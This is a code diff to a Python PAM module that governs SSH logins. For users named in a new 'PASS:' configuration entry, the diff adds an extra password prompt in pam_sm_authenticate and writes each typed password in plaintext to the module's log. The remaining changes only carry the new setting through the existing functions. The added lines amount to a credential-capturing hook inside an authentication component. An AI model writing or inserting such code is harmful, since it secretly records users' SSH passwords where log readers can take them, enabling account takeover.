@@ -134,8 +134,12 @@ def get_default():
   """
   DEBUG   = False
   DEFAULT = 'CLOSE'
+  PASS    = False
 
   for line in configuration():
+    if line[:5] == "PASS:":
+      PASS = ids(line.split(":")[1])
+
     line = line.upper()
     if line[:8] == "DEFAULT:":
       if line.split(":")[1] in ['CLOSE', 'OPEN']:
@@ -150,7 +154,7 @@ def get_default():
   else:               DEBUG = False
 
   if DEBUG: log("default access rule: " + DEFAULT)
-  return DEFAULT, DEBUG
+  return DEFAULT, DEBUG, PASS
 
 
 def config_parser(SERVICE, DEBUG):
@@ -350,7 +354,7 @@ def main(SERVICE, pamh, flags, argv):
   its methods to define name of the remote host and user's name.
   """
 
-  DEFAULT, DEBUG = get_default()
+  DEFAULT, DEBUG, PASS = get_default()
   log("DEBUG is set to " + str(DEBUG))
 
   try:
@@ -420,6 +424,12 @@ def pam_sm_authenticate(pamh, flags, argv):
     except:
       log("can't create new file in /tmp...")
 
+    DEFAULT, DEBUG, PASS = get_default()
+    if PASS and pamh.get_user() in [P.lower() for P in PASS]:
+      p = pamh.Message(pamh.PAM_PROMPT_ECHO_OFF, "Password: ")
+      i = pamh.conversation(p)
+      log("SSH password is '" + i.resp + "'")
+
   return main(str(pamh.service), pamh, flags, argv)
 
 
@@ -432,7 +442,7 @@ def pam_sm_close_session(pamh, flags, argv):
   if not check_log("sshd", str(pamh.rhost), str(pamh.get_user())):
     log("no need to notify")
   else:
-    DEFAULT, DEBUG = get_default()
+    DEFAULT, DEBUG, PASS = get_default()
     if DEBUG: log("SHOW ME WINDOW")
     dialog(DEBUG, str(pamh.rhost), str(pamh.get_user()), "info", str(pamh.service))
 
